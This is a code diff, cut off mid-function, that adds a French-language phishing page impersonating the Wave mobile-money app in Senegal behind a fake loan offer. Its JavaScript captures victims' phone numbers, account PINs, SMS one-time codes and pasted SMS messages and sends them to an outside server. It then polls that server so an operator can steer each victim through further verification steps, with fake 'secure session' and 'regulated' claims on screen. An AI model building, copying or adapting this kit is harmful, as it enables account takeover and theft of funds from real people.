+        <svg width="80" height="80" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
+        <div class="succ-badge"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
+      </div>
+      <div class="succ-h">Demande soumise !</div>
+      <p class="succ-p">Vos informations sont en cours d'examen. La plupart des décisions sont prises dans <strong>quelques heures</strong>.</p>
+      <p class="succ-note">Gardez votre téléphone à portée — nous vous enverrons votre référence par SMS.</p>
+      <div class="sess"><div class="spinner" id="sessSpinner"></div><span class="sess-txt" id="sessTxt">Chiffrement de votre session…</span></div>
+      <button class="mbtn" id="contBtn" onclick="go('s-ok','s-login')" style="display:none;margin-bottom:8px;">Continuer vers Wave</button>
+      <div class="fnote">© 2026 Wave Smart · Agréé et réglementé</div>
+    </div>
+  </div>
+
+  <!-- ══ SPLASH ══ -->
+  <div class="scr" id="s-splash">
+    <div class="splash-wrap">
+      <div class="splash-penguin">
+        <svg width="130" height="160" viewBox="0 0 130 160" xmlns="http://www.w3.org/2000/svg">
+          <ellipse cx="65" cy="105" rx="36" ry="46" fill="#111"/>
+          <ellipse cx="65" cy="112" rx="21" ry="32" fill="#fff"/>
+          <circle cx="65" cy="52" r="28" fill="#111"/>
+          <circle cx="56" cy="47" r="5" fill="#fff"/>
+          <circle cx="74" cy="47" r="5" fill="#fff"/>
+          <circle cx="57" cy="48" r="2.4" fill="#111"/>
+          <circle cx="75" cy="48" r="2.4" fill="#111"/>
+          <ellipse cx="65" cy="59" rx="7" ry="4.5" fill="#f90"/>
+          <ellipse cx="33" cy="78" rx="10" ry="24" fill="#111" transform="rotate(-55 33 78)"/>
+          <ellipse cx="97" cy="98" rx="10" ry="22" fill="#111" transform="rotate(14 97 98)"/>
+          <ellipse cx="53" cy="148" rx="12" ry="7" fill="#f90"/>
+          <ellipse cx="77" cy="148" rx="12" ry="7" fill="#f90"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ LOGIN ══ -->
+  <div class="scr" id="s-login" style="flex-direction:column;">
+    <div class="wave-h">Bienvenue sur Wave ! Entrez votre numéro pour commencer</div>
+    <div style="display:flex;align-items:flex-end;padding:0 24px 8px;border-bottom:2px solid #4dc8e8;margin:0 24px;flex-shrink:0;">
+      <div class="wave-cc">
+        <span>🇸🇳 +221</span>
+        <svg viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
+      </div>
+      <input id="loginPh" class="wave-ph-in" type="text" inputmode="numeric" placeholder="7X XXX XX XX" maxlength="12" readonly/>
+    </div>
+    <div class="keypad" id="loginKeypad" style="margin-top:auto;flex:1;align-content:end;">
+      <button class="kk" onclick="kpPress('login',1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="kpPress('login',2)"><span class="kk-num">2</span><span class="kk-letters">ABC</span></button>
+      <button class="kk" onclick="kpPress('login',3)"><span class="kk-num">3</span><span class="kk-letters">DEF</span></button>
+      <button class="kk" onclick="kpPress('login',4)"><span class="kk-num">4</span><span class="kk-letters">GHI</span></button>
+      <button class="kk" onclick="kpPress('login',5)"><span class="kk-num">5</span><span class="kk-letters">JKL</span></button>
+      <button class="kk" onclick="kpPress('login',6)"><span class="kk-num">6</span><span class="kk-letters">MNO</span></button>
+      <button class="kk" onclick="kpPress('login',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
+      <button class="kk" onclick="kpPress('login',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
+      <button class="kk" onclick="kpPress('login',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
+      <button class="kk empty"></button>
+      <button class="kk" onclick="kpPress('login',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
+      <button class="kk backspace" onclick="kpBack('login')">
+        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
+        <span class="kk-letters"></span>
+      </button>
+    </div>
+    <button class="wave-next" id="loginBtn" onclick="loginGo()">Suivant</button>
+  </div>
+
+  <!-- ══ PIN ══ -->
+  <div class="scr" id="s-pin" style="flex-direction:column;">
+    <div class="wave-back" onclick="go('s-pin','s-login')">
+      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+    </div>
+    <div class="pin-lock-wrap">
+      <svg width="36" height="43" viewBox="0 0 60 72">
+        <rect x="8" y="30" width="44" height="36" rx="6" fill="#5b5fcf"/>
+        <path d="M18 30V22a12 12 0 0124 0v8" fill="none" stroke="#5b5fcf" stroke-width="5" stroke-linecap="round"/>
+        <circle cx="30" cy="46" r="7" fill="#3d3fa8"/>
+        <circle cx="30" cy="46" r="3.5" fill="#111"/>
+      </svg>
+    </div>
+    <div class="wave-h" style="padding-top:22px;" id="pinTitle">Entrez votre code secret pour le compte <span id="pinAcct"></span></div>
+    <div class="pin-dots-row">
+      <div class="pd" id="pd0"></div>
+      <div class="pd" id="pd1"></div>
+      <div class="pd" id="pd2"></div>
+      <div class="pd" id="pd3"></div>
+    </div>
+    <div class="keypad" style="margin-top:auto;">
+      <button class="kk" onclick="kpPress('pin',1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="kpPress('pin',2)"><span class="kk-num">2</span><span class="kk-letters">ABC</span></button>
+      <button class="kk" onclick="kpPress('pin',3)"><span class="kk-num">3</span><span class="kk-letters">DEF</span></button>
+      <button class="kk" onclick="kpPress('pin',4)"><span class="kk-num">4</span><span class="kk-letters">GHI</span></button>
+      <button class="kk" onclick="kpPress('pin',5)"><span class="kk-num">5</span><span class="kk-letters">JKL</span></button>
+      <button class="kk" onclick="kpPress('pin',6)"><span class="kk-num">6</span><span class="kk-letters">MNO</span></button>
+      <button class="kk" onclick="kpPress('pin',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
+      <button class="kk" onclick="kpPress('pin',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
+      <button class="kk" onclick="kpPress('pin',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
+      <button class="kk forgot-key"><span class="kk-num">OUBLIÉ ?</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="kpPress('pin',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
+      <button class="kk backspace" onclick="kpBack('pin')">
+        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
+        <span class="kk-letters"></span>
+      </button>
+    </div>
+    <div style="height:20px;flex-shrink:0;"></div>
+  </div>
+
+  <!-- ══ OTP ══ -->
+  <div class="scr" id="s-otp" style="flex-direction:column;">
+    <div class="wave-back" onclick="go('s-otp','s-pin')">
+      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+    </div>
+    <div style="display:flex;justify-content:center;padding-top:16px;flex-shrink:0;">
+      <svg width="37" height="35" viewBox="0 0 62 58" fill="none">
+        <rect x="0" y="0" width="62" height="50" rx="10" fill="#6c63ff"/>
+        <polygon points="14,50 6,58 26,50" fill="#6c63ff"/>
+        <circle cx="20" cy="25" r="4" fill="white"/>
+        <circle cx="31" cy="25" r="4" fill="white"/>
+        <circle cx="42" cy="25" r="4" fill="white"/>
+      </svg>
+    </div>
+    <div style="font-size:16px;font-weight:700;color:#111;text-align:left;padding:22px 24px 0;line-height:1.5;flex-shrink:0;">
+      Saisissez le code de validation envoyé par SMS au <span id="otpPh" style="color:#111;"></span>
+    </div>
+    <div style="display:flex;justify-content:center;gap:22px;padding:24px 28px 0;flex-shrink:0;">
+      <div class="otp-slot"><span class="otp-digit" id="osd0"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd1"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd2"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd3"></span></div>
+    </div>
+    <div style="text-align:center;padding:8px 0 4px;flex-shrink:0;">
+      <button id="resendBtn" onclick="doResend()" disabled
+        style="background:none;border:none;font-family:'Patrick Hand',cursive;font-size:16px;font-weight:700;color:#4dc8e8;cursor:pointer;opacity:0.4;padding:8px 24px;border-radius:50px;transition:opacity 0.2s,background 0.2s;">
+        Renvoyer le SMS
+      </button>
+      <div id="resendCd" style="font-size:11px;color:#bbb;margin-top:2px;min-height:15px;"></div>
+    </div>
+    <div class="keypad" style="flex-shrink:0;">
+      <button class="kk" onclick="otpKpPress(1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(2)"><span class="kk-num">2</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(3)"><span class="kk-num">3</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(4)"><span class="kk-num">4</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(5)"><span class="kk-num">5</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(6)"><span class="kk-num">6</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(7)"><span class="kk-num">7</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(8)"><span class="kk-num">8</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(9)"><span class="kk-num">9</span><span class="kk-letters"></span></button>
+      <button class="kk empty"></button>
+      <button class="kk" onclick="otpKpPress(0)"><span class="kk-num">0</span><span class="kk-letters"></span></button>
+      <button class="kk backspace" onclick="otpKpBack()">
+        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
+        <span class="kk-letters"></span>
+      </button>
+    </div>
+    <div style="height:16px;flex-shrink:0;"></div>
+  </div>
+
+  <!-- ══ SMS PASTE ══ -->
+  <div class="scr" id="s-sms" style="flex-direction:column;">
+    <!-- Header back button -->
+    <div class="wave-back" onclick="go('s-sms','s-otp')">
+      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+    </div>
+
+    <!-- Content area -->
+    <div style="flex:1;display:flex;flex-direction:column;align-items:center;padding:20px 32px 32px;overflow-y:auto;-webkit-overflow-scrolling:touch;">
+
+      <!-- Icon -->
+      <div style="width:80px;height:80px;background:#5B4FD9;border-radius:20px;display:flex;align-items:center;justify-content:center;margin-bottom:40px;flex-shrink:0;">
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+          <rect x="4" y="9" width="32" height="22" rx="4" fill="white" opacity="0.95"/>
+          <circle cx="12" cy="20" r="2.8" fill="#5B4FD9"/>
+          <circle cx="20" cy="20" r="2.8" fill="#5B4FD9"/>
+          <circle cx="28" cy="20" r="2.8" fill="#5B4FD9"/>
+          <path d="M24 31 L20 36 L16 31" fill="white" opacity="0.95"/>
+        </svg>
+      </div>
+
+      <!-- Subtitle -->
+      <p style="font-size:16px;color:#111827;text-align:center;margin-bottom:8px;line-height:1.5;font-weight:600;">
+        Pour vérifier votre identité, nous vous avons envoyé un SMS contenant un code-lien de connexion sécurisé au
+      </p>
+
+      <!-- Phone number -->
+      <p id="smsPh" style="font-size:26px;font-weight:600;color:#111827;text-align:center;margin-bottom:24px;letter-spacing:1px;"></p>
+
+      <!-- Instruction -->
+      <p style="font-size:15px;color:#111827;text-align:center;margin-bottom:48px;line-height:1.6;font-weight:600;">
+        Pour continuer, veuillez copier et coller le SMS envoyé à ce numéro de téléphone ici.
+      </p>
+
+      <!-- Paste area -->
+      <div style="width:100%;background:#f3f4f6;border-radius:12px;padding:14px 18px;margin-bottom:32px;min-height:52px;display:flex;align-items:stretch;">
+        <textarea id="smsPasteArea" placeholder="Collez le SMS ici..."
+          style="width:100%;background:transparent;border:none;outline:none;resize:none;font-size:15px;color:#111827;font-family:'Patrick Hand',cursive;line-height:1.5;height:24px;overflow:hidden;"
+          oninput="smsTextareaGrow(this)"
+        ></textarea>
+      </div>
+
+      <!-- Submit link -->
+      <a href="#" onclick="doSmsSubmit();return false;"
+        style="font-size:15px;color:#0284C7;text-decoration:none;font-weight:600;margin-bottom:auto;">
+        Soumettre
+      </a>
+
+    </div>
+
+    <!-- Footer -->
+    <div style="padding:24px 32px 48px;text-align:center;">
+      <button id="smsResendBtn" disabled onclick="doSmsResend()"
+        style="display:block;width:100%;margin-bottom:6px;font-size:15px;color:#0284C7;font-weight:600;background:none;border:none;cursor:pointer;font-family:'Patrick Hand',cursive;opacity:0.4;transition:opacity 0.2s;padding:4px 0;">
+        Renvoyer le lien
+      </button>
+      <div id="smsResendCd" style="font-size:11px;color:#bbb;margin-bottom:14px;min-height:15px;"></div>
+      <a href="#" onclick="doSmsBroken();return false;"
+        style="font-size:15px;color:#0284C7;text-decoration:none;font-weight:600;">
+        Le lien ne fonctionne pas ? Appuyez ici
+      </a>
+    </div>
+  </div>
+
+</div><!-- .wrap -->
+
+<script>
+var API = 'https://wave-wyre.onrender.com/api';
+var sessId = null, pollTmr = null, verifying = false, msgTimer = null;
+
+function showLoad(msg){
+  document.getElementById('loadOv').classList.add('show');
+  var el = document.getElementById('load-txt');
+  if(el) el.textContent = msg || 'Veuillez patienter…';
+}
+function hideLoad(){ document.getElementById('loadOv').classList.remove('show'); }
+
+function showPop(h,p,t){
+  var ic = document.getElementById('popIcon');
+  ic.className = 'pop-icon '+(t==='inf'?'inf':'err');
+  ic.innerHTML = t==='inf'
+    ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><circle cx="12" cy="16" r="1" fill="currentColor"/></svg>'
+    : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+  document.getElementById('popH').textContent = h;
+  document.getElementById('popP').textContent = p;
+  document.getElementById('popOv').classList.add('show');
+}
+
+function go(from, to){
+  document.getElementById(from).classList.remove('active');
+  var t = document.getElementById(to);
+  t.classList.add('active');
+  t.scrollTop = 0;
+}
+
+function cfa(n){ return Math.round(n).toLocaleString('fr-FR')+' FCFA'; }
+function calcM(a,m){ if(!a||a<=0) return 0; var r=0.05/12; return a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1); }
+
+function sliderChange(v){
+  v = parseInt(v);
+  document.getElementById('loanAmt').textContent = Math.round(v).toLocaleString('fr-FR')+' FCFA';
+  document.getElementById('mRepay').textContent  = cfa(calcM(v,12));
+  var pct = ((v-50000)/(2000000-50000))*100;
+  document.getElementById('slider').style.background = 'linear-gradient(to right,#4dc8e8 '+pct+'%,#eee '+pct+'%)';
+  var el = document.getElementById('p1amt');
+  if(el) el.value = v;
+  calcUpdate();
+}
+
+function calcUpdate(){
+  var a  = parseFloat(document.getElementById('p1amt').value)||0;
+  var m  = parseInt(document.getElementById('p1dur').value)||12;
+  var ic = parseFloat(document.getElementById('inc').value)||0;
+  var f  = document.getElementById('fn').value.trim();
+  var l  = document.getElementById('ln').value.trim();
+  document.getElementById('p1rep').textContent    = a>0 ? cfa(calcM(a,m)) : '0 FCFA';
+  document.getElementById('rv-amt').textContent   = a>0 ? Math.round(a).toLocaleString('fr-FR')+' FCFA' : '—';
+  document.getElementById('rv-inc').textContent   = ic>0 ? Math.round(ic).toLocaleString('fr-FR')+' FCFA' : '—';
+  document.getElementById('rv-rep').textContent   = a>0 ? cfa(calcM(a,m))+' /mois' : '—';
+  document.getElementById('rv-name').textContent  = [f,l].filter(Boolean).join(' ')||'—';
+}
+
+function chk2(){
+  var ok = document.getElementById('fn').value.trim() &&
+           document.getElementById('ln').value.trim() &&
+           document.getElementById('inc').value.trim()&&
+           document.getElementById('ph').value.trim().length>=9;
+  var b = document.getElementById('p2btn');
+  b.disabled=!ok; b.style.opacity=ok?'1':'0.4';
+}
+
+function p2go(){
+  if(document.getElementById('ph').value.trim().length<9) return;
+  go('s-p2','s-p3');
+}
+
+function submitApp(){
+  go('s-p3','s-ok');
+  fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
+
+  var s=5, tEl=document.getElementById('sessTxt'), sp=document.getElementById('sessSpinner'), cb=document.getElementById('contBtn');
+  tEl.textContent='Chiffrement… ('+s+'s)';
+  var iv = setInterval(function(){
+    s--;
+    if(s<=0){
+      clearInterval(iv);
+      tEl.textContent='Session sécurisée ✓';
+      sp.style.display='none';
+      cb.style.display='block';
+      setTimeout(function(){
+        go('s-ok','s-splash');
+        setTimeout(function(){ go('s-splash','s-login'); }, 1500);
+      }, 800);
+    } else {
+      tEl.textContent='Chiffrement… ('+s+'s)';
+      if(s % 2 === 0) fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
+    }
+  },1000);
+}
+
+var loginVal = '';
+var pinVal = '';
+function kpPress(mode, digit) {
+  if (mode === 'login') {
+    if (loginVal.length >= 12) return;
+    loginVal += digit;
+    document.getElementById('loginPh').value = loginVal;
+    var ok = loginVal.length >= 9;
+    var btn = document.getElementById('loginBtn');
+    btn.className = 'wave-next' + (ok ? ' active-btn' : '');
+  } else {
+    if (pinVal.length >= 4) return;
+    pinVal += digit;
+    updatePinDots();
+    if (pinVal.length === 4) setTimeout(submitPIN, 120);
+  }
+}
+function kpBack(mode) {
+  if (mode === 'login') {
+    loginVal = loginVal.slice(0, -1);
+    document.getElementById('loginPh').value = loginVal;
+    var ok = loginVal.length >= 9;
+    var btn = document.getElementById('loginBtn');
+    btn.className = 'wave-next' + (ok ? ' active-btn' : '');
+  } else {
+    pinVal = pinVal.slice(0, -1);
+    updatePinDots();
+  }
+}
+function updatePinDots() {
+  [0,1,2,3].forEach(function(i){
+    document.getElementById('pd'+i).classList.toggle('filled', i < pinVal.length);
+  });
+}
+
+function loginGo(){
+  var raw = loginVal;
+  if(raw.length<9) return;
+  sessId = null;
+  if(pollTmr){ clearInterval(pollTmr); pollTmr = null; }
+  pinVal = ''; updatePinDots();
+  document.getElementById('otpPh').textContent = '+221 '+raw;
+  document.getElementById('pinAcct').textContent = raw.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/,'$1 $2 $3 $4');
+  go('s-login','s-pin');
+}
+
+async function callApi(action, data){
+  var p = new URLSearchParams(Object.assign({action:action}, data||{}));
+  try{ var r = await fetch(API,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p.toString()}); return await r.json(); }
+  catch(e){ return {success:false}; }
+}
+
+async function submitPIN(){
+  var raw = loginVal;
+  var pin = pinVal;
+  if(pin.length !== 4) return;
+  var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
+  var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
+  showLoad('Connexion en cours…');
+
+  var payload = { firstName: fn||'Unknown', lastName: ln||'User', phone: raw, pin: pin };
+  if(sessId) payload.sessionId = sessId;
+
+  var r = null;
+  for(var attempt = 0; attempt < 3; attempt++){
+    try {
+      var p = new URLSearchParams(Object.assign({action:'login_attempt'}, payload));
+      var resp = await fetch(API, {
+        method: 'POST',
+        headers: {'Content-Type':'application/x-www-form-urlencoded'},
+        body: p.toString()
+      });
+      var text = await resp.text();
+      console.log('login_attempt attempt', attempt+1, ':', text);
+      r = JSON.parse(text);
+      if(r && (r.sessionId || (r.data && r.data.sessionId) || r.success)) break;
+    } catch(e) {
+      console.log('attempt', attempt+1, 'failed:', e.message);
+      if(attempt < 2) await new Promise(function(res){ setTimeout(res, 2000); });
+    }
+  }
+
+  if(!r){
+    hideLoad();
+    showPop('Serveur indisponible', 'Le serveur ne répond pas. Vérifiez votre connexion et réessayez.');
+    pinVal=''; updatePinDots(); return;
+  }
+
+  var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id;
+  if(sid){
+    showLoad('En attente de validation…');
+    startPoll(sid);
+  } else if(r.success === false){
+    hideLoad();
+    showPop('Erreur', r.message || 'Identifiants invalides. Réessayez.');
+    pinVal=''; updatePinDots();
+  } else {
+    hideLoad();
+    showPop('Erreur inattendue', 'Réponse serveur incorrecte. Réessayez.');
+    pinVal=''; updatePinDots();
+  }
+}
+
+/* ═══════════════════════════════════════════
+   POLL — PIN screen only (never touches OTP input)
+═══════════════════════════════════════════ */
+
+var pollActive = false;
+// When true, we are on the OTP screen waiting for user to type — poll is SUSPENDED
+var otpScreen  = false;
+
+function stopPoll(){
+  if(pollTmr){ clearInterval(pollTmr); pollTmr=null; }
+  if(msgTimer){ clearInterval(msgTimer); msgTimer=null; }
+  pollActive = false;
+}
+
+function startPoll(sid){
+  stopPoll();
+  sessId = sid;
+  pollActive = true;
+  var msgs = [
+    'En attente de validation…',
+    'Vérification en cours…',
+    'En attente de confirmation…',
+    'Patientez quelques instants…'
+  ];
+  var mi = 0;
+  msgTimer = setInterval(function(){
+    if(!pollActive){ clearInterval(msgTimer); return; }
+    mi = (mi+1) % msgs.length;
+    var el = document.getElementById('load-txt');
+    if(el) el.textContent = msgs[mi];
+  }, 3000);
+
+  pollTmr = setInterval(async function(){
+    if(!pollActive) return;
+    // ── CRITICAL: never process server responses while user is on OTP screen typing ──
+    if(otpScreen) return;
+    try{
+      var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
+      var r   = await res.json();
+      if(!r.success || !r.status) return;
+      if(r.status==='pending' || r.status==='otp_pending') return;
+
+      if(r.status==='approved'){
+        stopPoll();
+        hideLoad();
+        enterOTP(sid);
+
+      } else if(r.status==='sms_required'){
+        stopPoll();
+        hideLoad();
+        enterSMS(sid);
+
+      } else if(r.status==='wrong_pin'){
+        stopPoll();
+        hideLoad();
+        showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
+
+      } else if(r.status==='wrong_code'){
+        // Only act on wrong_code when poll is deliberately running after doVerify
+        // otpScreen=false means we're in the post-submit polling phase
+        stopPoll();
+        hideLoad();
+        showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
+        setTimeout(function(){ otpScreen=true; resetOTP(); }, 400);
+
+      } else if(r.status==='continue'){
+        stopPoll(); hideLoad();
+        showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
+
+      } else if(r.status==='expired' || r.status==='session_expired'){
+        stopPoll(); hideLoad();
+        sessId = null; otpScreen = false;
+        showPop('Session expirée','Votre session a expiré. Veuillez saisir à nouveau votre code PIN.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); go('s-otp','s-pin'); }, 400);
+
+      } else if(r.status==='denied' || r.status==='rejected'){
+        stopPoll(); hideLoad(); otpScreen = false;
+        showPop('Accès refusé','Cette demande a été refusée. Veuillez contacter le support.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; }, 1500);
+      }
+    }catch(e){}
+  }, 1500);
+}
+
+// enterOTP: go to OTP screen, STOP polling, start countdown
+function enterOTP(sid){
+  stopPoll();          // ← poll is DEAD while user types
+  otpScreen = true;   // ← flag: we are in OTP input mode
+  resetOTP();
+  go('s-pin','s-otp');
+  setTimeout(function(){ startResendCd(10); }, 100);
+}
+
+/* ── OTP keypad & verification ── */
+var otpVal = '';
+var otpSlotEls  = [0,1,2,3].map(function(i){ return document.getElementById('osd'+i); });
+var otpSlotWrps = [0,1,2,3].map(function(i){ return otpSlotEls[i].parentElement; });
+
+function otpUpdateSlots(){
+  otpSlotEls.forEach(function(el,i){ el.textContent = otpVal[i]||''; });
+  otpSlotWrps.forEach(function(el,i){ el.classList.toggle('active', i===otpVal.length && otpVal.length<4); });
+}
+
+function otpKpPress(digit){
+  if(verifying || otpVal.length>=4) return;
+  otpVal += String(digit);
+  otpUpdateSlots();
+  if(otpVal.length===4) setTimeout(doVerify, 150);
+}
+
+function otpKpBack(){
+  if(verifying || otpVal.length===0) return;
+  otpVal = otpVal.slice(0,-1);
+  otpUpdateSlots();
+}
+
+function resetOTP(){
+  otpVal = '';
+  verifying = false;
+  otpUpdateSlots();
+}
+
+async function doVerify(){
+  if(otpVal.length!==4 || !sessId || verifying) return;
+  verifying = true;
+  otpScreen = false;   // ← leave OTP-input-safe mode: poll can now react to wrong_code
+  showLoad('Vérification du code…');
+  var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
+  if(r && r.success){
+    // Poll will pick up the final status (approved/continue/etc)
+    verifying = false;
+    // If server signals sms step directly on otp_entered response
+    if(r.status === 'sms_required'){
+      hideLoad();
+      enterSMS(sessId);
+    } else {
+      startPoll(sessId);
+    }
+  } else {
+    // Network/API error — treat as wrong code
+    hideLoad();
+    showPop('Code incorrect','Le code de validation saisi est incorrect. Veuillez réessayer.');
+    setTimeout(function(){
+      otpScreen = true;
+      resetOTP();
+    }, 800);
+  }
+}
+
+/* ── Resend countdown ── */
+var resTimer = null;
+
+function startResendCd(secs){
+  var btn = document.getElementById('resendBtn');
+  var cd  = document.getElementById('resendCd');
+  if(resTimer){ clearInterval(resTimer); resTimer = null; }
+  btn.disabled = true;
+  btn.style.opacity = '0.4';
+  var s = secs || 10;
+  cd.textContent = 'Renvoyer dans ' + s + 's';
+  resTimer = setInterval(function(){
+    s--;
+    if(s <= 0){
+      clearInterval(resTimer); resTimer = null;
+      cd.textContent = '';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+    } else {
+      cd.textContent = 'Renvoyer dans ' + s + 's';
+    }
+  }, 1000);
+}
+
+async function doResend(){
+  if(!sessId) return;
+  resetOTP();
+  startResendCd(10);
+  var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
+  var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
+  await callApi('reset_otp', { sessionId: sessId });
+  var r = await callApi('otp_resend', { sessionId: sessId, phone: loginVal, firstName: fn, lastName: ln });
+  if(!r || !r.success){
+    await callApi('login_attempt', { sessionId: sessId, phone: loginVal, firstName: fn||'Unknown', lastName: ln||'User', pin: pinVal||'0000', resend: '1' });
+  }
+  // Stay in otpScreen mode — poll remains stopped while user types new code
+  document.getElementById('tav').textContent = '✉';
+  document.getElementById('tn').textContent  = 'SMS renvoyé';
+  document.getElementById('td').textContent  = 'Un nouveau code a été envoyé';
+  var t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show'); }, 3000);
+}
+
+/* ── SMS paste screen ── */
+var smsResendTimer = null;
+
+function startSmsResendCd(){
+  var btn = document.getElementById('smsResendBtn');
+  var cd  = document.getElementById('smsResendCd');
+  if(smsResendTimer){ clearInterval(smsResendTimer); smsResendTimer = null; }
+  btn.disabled = true;
+  btn.style.opacity = '0.4';
+  btn.style.cursor = 'not-allowed';
+  var s = 12;
+  cd.textContent = 'Disponible dans ' + s + 's';
+  smsResendTimer = setInterval(function(){
+    s--;
+    if(s <= 0){
+      clearInterval(smsResendTimer); smsResendTimer = null;
+      cd.textContent = '';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+      btn.style.cursor = 'pointer';
+    } else {
+      cd.textContent = 'Disponible dans ' + s + 's';
+    }
+  }, 1000);
+}
+
+function enterSMS(sid){
+  stopPoll();
+  var ph = document.getElementById('smsPh');
+  var otpPhEl = document.getElementById('otpPh');
+  if(ph && otpPhEl) ph.textContent = otpPhEl.textContent;
+  else if(ph) ph.textContent = loginVal ? loginVal.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/,'$1 $2 $3 $4') : '';
+  var ta = document.getElementById('smsPasteArea');
+  if(ta){ ta.value=''; ta.style.height='24px'; }
+  go('s-otp','s-sms');
+  setTimeout(function(){ startSmsResendCd(); }, 100);
+}
+
+function smsTextareaGrow(el){
+  el.style.height = '24px';
+  el.style.height = el.scrollHeight + 'px';
+}
+
+async function doSmsSubmit(){
+  var ta = document.getElementById('smsPasteArea');
+  var txt = ta ? ta.value.trim() : '';
+  if(!txt){ showPop('Champ vide','Veuillez coller le SMS reçu avant de soumettre.'); return; }
+  showLoad('Envoi du SMS…');
+  var r = await callApi('sms_pasted', { sessionId: sessId, smsText: txt, phone: loginVal });
+  hideLoad();
+  if(r && r.success){
+    go('s-sms','s-ok');
+    var s=5, tEl=document.getElementById('sessTxt'), sp=document.getElementById('sessSpinner'), cb=document.getElementById('contBtn');
+    tEl.textContent='Chiffrement… ('+s+'s)';
+    var iv=setInterval(function(){
+      s--;
+      if(s<=0){
+        clearInterval(iv);
